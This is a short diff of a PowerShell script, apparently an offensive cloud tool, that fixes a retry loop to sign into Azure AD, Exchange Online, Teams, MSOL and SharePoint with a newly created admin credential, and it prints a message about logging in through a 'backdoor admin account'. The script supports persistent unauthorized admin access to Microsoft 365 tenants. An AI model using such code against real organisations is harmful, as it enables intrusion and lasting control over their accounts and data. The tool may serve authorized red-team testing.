@@ -71,12 +71,12 @@ function NewAdminAccountCreation {
         while ($attempt -lt 10) {
             try {
                 AccessAzureAD $global:NewAdminUsername $global:NewAdminCredential
-                AccessAzAccount $global:NewAdminUsername $global:AdminCredential
-                AccessTeams $global:NewAdminUsername $global:AdminCredential
-                AccessExchangeOnline $global:NewAdminUsername $global:AdminCredential
-                AccessMsol $global:NewAdminUsername $global:AdminCredential
-                AccessSharepoint $global:NewAdminUsername $global:AdminCredential
-                AccessSharepointAdmin $global:NewAdminUsername $global:AdminCredential
+                AccessAzAccount $global:NewAdminUsername $global:NewAdminCredential
+                AccessTeams $global:NewAdminUsername $global:NewAdminCredential
+                AccessExchangeOnline $global:NewAdminUsername $global:NewAdminCredential
+                AccessMsol $global:NewAdminUsername $global:NewAdminCredential
+                AccessSharepoint $global:NewAdminUsername $global:NewAdminCredential
+                AccessSharepointAdmin $global:NewAdminUsername $global:NewAdminCredential
                 
                 Write-Host "Successfully logged in using new backdoor admin account!!!" -ForegroundColor Yellow -BackgroundColor Black
                 Write-Host "You are now logged in as $global:NewAdminDisplayName : $global:NewAdminUserName" -ForegroundColor Yellow -BackgroundColor Black
